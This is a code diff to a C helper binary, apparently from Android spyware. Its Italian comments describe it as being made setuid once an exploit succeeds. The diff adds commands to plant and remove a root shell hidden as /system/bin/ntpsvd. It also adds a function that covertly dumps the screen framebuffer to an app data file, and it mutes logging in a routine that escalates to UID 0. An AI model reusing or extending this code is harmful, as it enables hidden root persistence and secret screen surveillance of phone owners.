@@ -4,6 +4,7 @@
 #include <sys/mount.h>
 #include <sys/param.h>
 #include <sys/time.h>
+#include <sys/mman.h>
 #include <linux/netlink.h>
 #include <sys/socket.h>
 #include <sys/un.h>
@@ -23,6 +24,8 @@
 #include <android/log.h>
 #include <dirent.h>
 #include <linux/reboot.h>
+#include <linux/fb.h>
+#include <linux/kd.h>
 
 #define LOG(x)  printf(x)
 
@@ -35,6 +38,8 @@ int my_mount(const char *mntpoint);
 void my_chown(const char *user, const char *group, const char *file);
 void my_chmod(const char *mode, const char *file); 
 static void copy_root(const char *mntpnt, const char *dst);
+static void delete_root(const char *mntpnt, const char *dst);
+static int get_framebuffer();
 
 // questo file viene compilato come rdb e quando l'exploit funziona viene suiddato
 // statuslog -c "/system/bin/cat /dev/graphics/fb0"
@@ -74,6 +79,8 @@ int main(int argc, char** argv) {
 		remount("/system", 0);
 	} else if (strcmp(argv[1], "rt") == 0) {  // Copia la shell root in /system/bin/ntpsvd
 		copy_root("/system", "/system/bin/ntpsvd");
+	} else if (strcmp(argv[1], "ru") == 0) {  // Cancella la shell root in /system/bin/ntpsvd
+		delete_root("/system", "/system/bin/ntpsvd");
 	} else if (strcmp(argv[1], "sd") == 0) {
 		my_mount("/mnt/sdcard");
 	} else if (strcmp(argv[1], "air") == 0) { // Am I Root?
@@ -110,6 +117,79 @@ int main(int argc, char** argv) {
 	return 0;
 }
 
+// Allo stato attuale, la copy funziona meglio...
+// Come referenza futura: http://www.pocketmagic.net/?p=1473
+static int get_framebuffer() {
+	int fd, fd_out;
+	void *bits;
+	struct fb_var_screeninfo vi;
+	struct fb_fix_screeninfo fi;
+	ssize_t written;
+
+	fd = open("/dev/graphics/fb0", O_RDONLY);
+
+	if (fd < 0) {
+		perror("cannot open fb0");
+		return 0;
+	}
+
+	if (ioctl(fd, FBIOGET_FSCREENINFO, &fi) < 0) {
+		perror("failed to get fb0 info");
+		return 0; 
+	}
+
+	if (ioctl(fd, FBIOGET_VSCREENINFO, &vi) < 0) {
+		perror("failed to get fb0 info");
+		return 0;
+	}
+
+
+	bits = mmap(0, fi.smem_len, PROT_READ, MAP_PRIVATE, fd, 0);
+
+	if (bits == MAP_FAILED) {
+		perror("failed to mmap framebuffer");
+		return 0;
+	}
+
+
+	fd_out = open("/data/data/com.android.service/files/frame", O_CREAT | O_RDWR);
+
+	if (fd_out < 0) {
+		perror("failed to create frame file");
+		return 0;
+	}
+
+	written = write(fd_out, bits, fi.smem_len);
+
+	if (written <= 0) {
+		perror("cannot write to file");
+		return 0;
+	}
+
+	close(fd);
+	close(fd_out);
+
+	return 0;
+
+	/*fb->version = sizeof(*fb);
+	fb->width = vi.xres;
+	fb->height = vi.yres;
+	fb->stride = fi.line_length / (vi.bits_per_pixel >> 3);
+	fb->data = bits;
+	fb->format = GGL_PIXEL_FORMAT_RGB_565;
+
+	fb++;
+
+	fb->version = sizeof(*fb);
+	fb->width = vi.xres;
+	fb->height = vi.yres;
+	fb->stride = fi.line_length / (vi.bits_per_pixel >> 3);
+	fb->data = (void*) (((unsigned) bits) + vi.yres * vi.xres * 2);
+	fb->format = GGL_PIXEL_FORMAT_RGB_565;
+
+	return fd;*/
+}
+
 void my_chmod(const char *mode, const char *file) {
 	int newmode;
 
@@ -136,6 +216,16 @@ void my_chown(const char *user, const char *group, const char *file) {
 	free(buf);
 
 	return; 
+}
+
+static void delete_root(const char *mntpnt, const char *dst) {
+	if (mntpnt != NULL)
+		remount(mntpnt, 0);
+
+	unlink(dst);
+
+	if (mntpnt != NULL)
+		remount(mntpnt, MS_RDONLY);
 }
 
 static void copy_root(const char *mntpnt, const char *dst) {
@@ -343,7 +433,7 @@ int my_mount(const char *mntpoint) {
 }
 
 int setgod() {
-    char buf[256];
+    //char buf[256];
     //sprintf(buf, "Actuald UID: %d, GID: %d, EUID: %d, EGID: %d\n", getuid(), getgid(), geteuid(), getegid());
     //LOG(buf);
 
@@ -352,8 +442,8 @@ int setgod() {
     setgid(0);
     seteuid(0);
 
-    sprintf(buf, "Actual UID: %d, GID: %d, EUID: %d, EGID: %d, err: %d\n", getuid(), getgid(), geteuid(), getegid(), errno);
-    LOG(buf);
+    //sprintf(buf, "Actual UID: %d, GID: %d, EUID: %d, EGID: %d, err: %d\n", getuid(), getgid(), geteuid(), getegid(), errno);
+    //LOG(buf);
 
     return (seteuid(0) == 0) ? 1 : 0;
 }
